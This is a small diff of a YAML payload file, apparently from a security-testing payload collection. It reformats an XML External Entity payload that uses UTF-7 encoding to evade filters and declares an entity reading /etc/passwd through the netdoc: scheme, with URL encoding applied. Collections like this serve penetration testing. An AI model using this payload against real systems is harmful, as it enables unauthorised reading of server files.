@@ -1,7 +1,6 @@
 ---
 payload:
-- <?xml version="1.0" encoding="UTF-7"?> +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo
-  ANY
+- <?xml version="1.0" encoding="UTF-7"?> +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY
 - <!ENTITY % data SYSTEM "netdoc:/etc/passwd">
 encoder:
 - URL
